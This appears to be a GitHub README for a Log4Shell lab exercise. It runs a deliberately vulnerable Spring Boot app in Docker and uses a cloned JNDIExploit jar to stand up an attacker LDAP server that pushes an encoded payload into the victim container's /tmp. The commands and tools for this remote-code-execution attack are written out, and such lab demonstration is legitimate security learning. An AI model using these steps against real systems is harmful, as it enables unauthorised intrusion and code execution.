# Log4j-Vulnerability
This repository is based on the Implementation of Log4j shell vulnerability, which helps in creating attacking the victim machine by executing the payload through victims web server.

## 3 steps to exploit

 - Run the vulnerable application in the victims machine
 - Create attackers own LDAP server with JNDI LOOKUPS
 - Sending the exploitable payload to the victims machine.

 ## Excuting Log4j Vulnerability

the whole process would be implemented in the docker

Install Docker in Linux machine

Implementing Log4j vulnerability

Executing the vulnerability in the DOCKER

1) Installing Docker

```bash
 $sudo apt update
 ```

```bash
 $sudo apt install docker.io
```
After installing docker

Clone the git repository of christophetd for Log4shell vulnerable app

https://github.com/christophetd/log4shell-vulnerable-app.git

```bash
git clone https://github.com/christophetd/log4shell-vulnerable-app.git 
```

search for the docker images
The Image would be 

![VirtualBox_Ubuntu_26_04_2023_00_21_09](https://user-images.githubusercontent.com/67511735/234433896-527b8cc6-c828-4446-8e14-2028db2d6acd.png)

## Running the vulnerable application on victims machine

Execute the command which will help in genetating a spring boot web application which will be vulnerable to log4j shell

```bash
docker run --rm -it -p 8080:8080  ghcr.io/christophetd/log4shell-vulnerable-app
```


![VirtualBox_Ubuntu_26_04_2023_00_21_28](https://user-images.githubusercontent.com/67511735/234441126-d6332a49-0d58-42f8-bf94-db86cc842925.png)

## Creating Attckers LDAP server

Once the vulnerable web server is accepting the request Attacker create his own LDAP server to send the malicious payload to the victims system

Download the Git repositry for Exploiting the JNDI exploit

 https://github.com/black9/Log4shell_JNDIExploit.git 

```bash
git clone  https://github.com/black9/Log4shell_JNDIExploit.git
```

After downloading the git repository unzip the exploitable jar file to generate the LDAP server

Execute the jar file using java with attacker IP address

>  java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.2.15 -p 8888

The generates the attackers LDAP server

![VirtualBox_Ubuntu_26_04_2023_00_22_27](https://user-images.githubusercontent.com/67511735/234442901-1be304c6-9257-497b-a69d-b3fe69a88f4c.png)

LDAP and HTTP server stars listining on the ldap port 1389

## Executing the Payload

Attcker can now start creating malicous payload to exploit the victim machine

playload can be created by insertng some malicious messages or text and convert it into base64 and attach to the attackers LDAP server
The name of the payload is the malicious.txt file which will be stored in the tmp folder of the victim machine


![VirtualBox_Ubuntu_26_04_2023_00_22_59](https://user-images.githubusercontent.com/67511735/234443864-65b0bc36-0d28-41fa-b907-dd14daf85b86.png)

## Exploit

Now the Attacker can send an JNDI lookup request with the this encoded payload to the victims tmp folder

- The web server accepts the request by the Attackers LDAP server

![VirtualBox_Ubuntu_26_04_2023_00_22_10](https://user-images.githubusercontent.com/67511735/234446793-6d9368b1-3cec-4b39-8963-7ab0655ea3f9.png)

- To check the if payload is executed or not in the docker container

![VirtualBox_Ubuntu_26_04_2023_00_22_59](https://user-images.githubusercontent.com/67511735/234446901-ee3060e9-d5a2-4804-9582-09ffb5eb39a6.png)







